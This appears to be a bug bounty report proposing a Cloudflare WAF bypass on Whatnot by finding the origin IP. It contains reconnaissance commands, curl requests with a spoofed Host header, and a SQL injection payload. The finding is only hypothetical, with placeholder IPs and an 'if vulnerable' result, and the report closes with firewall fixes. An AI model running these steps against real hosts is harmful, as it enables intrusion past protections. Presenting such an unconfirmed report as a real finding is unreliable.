# HackerOne Submission — Cloudflare WAF Bypass via Origin Server IP Discovery

**Program:** Whatnot  
**Weakness:** Security Misconfiguration / WAF Bypass  
**Severity:** Medium  
**Asset:** api.whatnot.com / whatnot.com  

---

## Summary

Whatnot routes all traffic through Cloudflare for WAF protection, DDoS mitigation, and bot detection. If the origin server's real IP address is discoverable through historical DNS records, certificate transparency logs, email headers, or misconfigured subdomains, an attacker can send HTTP requests directly to the origin server — bypassing all Cloudflare WAF rules, rate limits, and bot protection. This enables exploitation of vulnerabilities that Cloudflare's WAF would normally block.

---

## Steps to Reproduce

### Step 1 — Check historical DNS records

```bash
# SecurityTrails historical DNS (free API)
curl -s "https://api.securitytrails.com/v1/history/whatnot.com/dns/a" \
  -H "apikey: YOUR_SECURITYTRAILS_KEY" | python3 -m json.tool

# ViewDNS history
# Visit: https://viewdns.info/iphistory/?domain=whatnot.com

# Check for pre-Cloudflare IP addresses in records older than Cloudflare adoption
```

---

### Step 2 — Search Shodan/Censys for origin server

```bash
# Search Shodan for servers presenting Whatnot's SSL certificate
# Visit: https://www.shodan.io/search?query=ssl.cert.subject.cn%3Awhatnot.com
# Or: https://search.shodan.io/search?query=http.title:"Whatnot"+port:443

# Search Censys
# Visit: https://search.censys.io/search?resource=hosts&q=services.tls.certificates.leaf_data.subject_dn%3Awhatnot.com

# Look for IPs that:
# - Have whatnot.com in their TLS certificate
# - Are NOT Cloudflare IP ranges (104.16.0.0/12, 172.64.0.0/13, 131.0.72.0/22)
```

---

### Step 3 — Check email headers for origin IP

Whatnot sends transactional emails (order confirmations, password resets). The email's `Received:` headers often reveal the real sending server IP:

```
# Request a password reset for your own account
# View the raw email source
# Look for Received: headers showing non-Cloudflare IPs

Received: from mail.whatnot.com (ORIGIN-IP-HERE)
```

---

### Step 4 — Check MX records and mail servers

```bash
# MX records often point to origin infrastructure not behind Cloudflare
dig MX whatnot.com
dig A mail.whatnot.com
dig A smtp.whatnot.com

# These may resolve to real origin IPs
```

---

### Step 5 — Attempt direct connection to discovered origin IP

If an origin IP is found (e.g., `X.X.X.X`):

```bash
# Bypass Cloudflare by connecting directly with Host header
curl -s -X POST "https://X.X.X.X/seller-api/graphql" \
  -H "Host: api.whatnot.com" \
  -H "Content-Type: application/json" \
  -H "X-Whatnot-App: whatnot-web" \
  --insecure \
  -d '{"query": "{ __schema { types { name } } }"}'

# Test WAF bypass - try a SQL injection payload that Cloudflare would block:
curl -s "https://X.X.X.X/seller-api/graphql?id=1' OR '1'='1" \
  -H "Host: api.whatnot.com" \
  --insecure
```

---

### Step 6 — Confirm WAF bypass

Compare Cloudflare-proxied vs. direct requests:

```bash
# Via Cloudflare (blocked by WAF)
curl -s -o /dev/null -w "%{http_code}" \
  "https://api.whatnot.com/seller-api/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'
# Expected: 403 (WAF blocks introspection or unauthed request)

# Direct to origin (WAF bypassed)
curl -s -o /dev/null -w "%{http_code}" \
  "https://ORIGIN_IP/seller-api/graphql" \
  -H "Host: api.whatnot.com" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'
# Vulnerable: 200 or different response
```

---

## Expected Result

Origin server should only accept connections from Cloudflare IP ranges (enforced via firewall/security group). Direct connections from non-Cloudflare IPs should be dropped or return 403.

## Actual Result (if vulnerable)

Origin server accepts direct HTTP connections, returning application responses that bypass all Cloudflare WAF rules.

---

## Impact

- All Cloudflare WAF rules become ineffective — SQL injection, XSS, path traversal payloads that Cloudflare blocks can be sent directly
- Rate limiting enforced by Cloudflare is bypassed — enables unlimited brute force attacks
- Bot detection is bypassed — allows scraping and automation at scale
- DDoS protection is bypassed — enables volumetric attacks directly against origin

---

## Recommended Fix

- Configure AWS Security Groups / firewall rules to **only accept inbound HTTPS traffic from Cloudflare IP ranges**
- Cloudflare publishes its IP list at: https://www.cloudflare.com/ips/
- AWS example:
  ```
  Inbound: Allow TCP 443 from 103.21.244.0/22, 103.22.200.0/22, ... (all Cloudflare ranges)
  Inbound: Deny TCP 443 from 0.0.0.0/0
  ```
- Enable Cloudflare Authenticated Origin Pulls (mutual TLS between Cloudflare and origin)
- Reference: [Cloudflare Authenticated Origin Pulls](https://developers.cloudflare.com/ssl/origin-configuration/authenticated-origin-pull/)
